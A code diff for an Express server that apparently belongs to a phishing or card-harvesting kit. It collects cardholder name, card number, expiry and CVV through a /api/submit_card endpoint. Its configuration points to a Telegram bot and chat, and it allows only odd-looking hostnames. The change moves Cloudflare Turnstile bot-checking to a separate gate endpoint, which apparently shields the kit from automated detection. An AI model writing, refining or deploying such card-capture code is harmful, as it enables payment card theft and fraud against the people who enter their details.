@@ -9,7 +9,6 @@ const CHAT_ID = process.env.CHAT_ID;
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 const WHITELISTED = (process.env.WHITELISTED_IPS || '').split(',').map(s => s.trim()).filter(Boolean);
 
-// Turnstile Configuration
 const TURNSTILE_SECRET = process.env.TURNSTILE_SECRET;
 const ALLOWED_HOSTNAMES = new Set(['goe.jekklim.org', 'vop-pink.vercel.app', 'localhost', '127.0.0.1']);
 
@@ -146,6 +145,34 @@ function healthHandler(req, res) {
 app.get('/api/health', healthHandler);
 app.get('/health', healthHandler);
 
+/* ---------- NEW: Turnstile Gate Verification ---------- */
+app.post('/api/verify_gate', async (req, res) => {
+  const turnstileToken = req.body['cf-turnstile-response'];
+  if (!turnstileToken) return res.status(403).json({ ok: false, error: 'missing_token' });
+
+  try {
+    const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({
+        secret: TURNSTILE_SECRET,
+        response: turnstileToken,
+        remoteip: clientIp(req)
+      })
+    });
+    const verifyData = await verifyRes.json();
+    
+    // Check if success and action is 'gate'
+    if (verifyData.success && verifyData.action === 'gate' && ALLOWED_HOSTNAMES.has(verifyData.hostname)) {
+      return res.json({ ok: true });
+    } else {
+      return res.status(403).json({ ok: false, error: 'turnstile_failed', details: verifyData });
+    }
+  } catch (err) {
+    return res.status(500).json({ ok: false, error: 'turnstile_error' });
+  }
+});
+
 /* ---------- check_status ---------- */
 app.get('/api/check_status', async (req, res) => {
   res.set('Cache-Control', 'no-store');
@@ -164,33 +191,10 @@ app.get('/api/reset_state', async (req, res) => {
 /* ---------- submit_card ---------- */
 app.post('/api/submit_card', async (req, res) => {
   const { sid, name = '', cardNumber = '', expiry = '', cvv = '' } = req.body || {};
-  const turnstileToken = req.body['cf-turnstile-response'];
-  
   if (!sid || !cardNumber) return res.json({ ok: false, error: 'missing' });
   
-  // --- TURNSTILE VERIFICATION ---
-  if (!turnstileToken) return res.json({ ok: false, error: 'turnstile_missing' });
-  try {
-    const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: new URLSearchParams({
-        secret: TURNSTILE_SECRET,
-        response: turnstileToken,
-        remoteip: clientIp(req)
-      })
-    });
-    const verifyData = await verifyRes.json();
-    
-    if (!verifyData.success || verifyData.action !== 'checkout' || !ALLOWED_HOSTNAMES.has(verifyData.hostname)) {
-      console.warn('[turnstile] failed', verifyData);
-      return res.json({ ok: false, error: 'turnstile_failed' });
-    }
-  } catch (err) {
-    console.error('[turnstile] error', err);
-    return res.json({ ok: false, error: 'turnstile_error' });
-  }
-  // -----------------------------
+  // Note: We don't need to check Turnstile token again here, because they already passed the Gate.
+  // However, you can optionally add a check here if you want extra security.
 
   if (!luhnCheck(cardNumber)) return res.json({ ok: false, error: 'invalid_luhn' });
   if (containsBadWord(name)) return res.json({ ok: false, error: 'bad_words' });
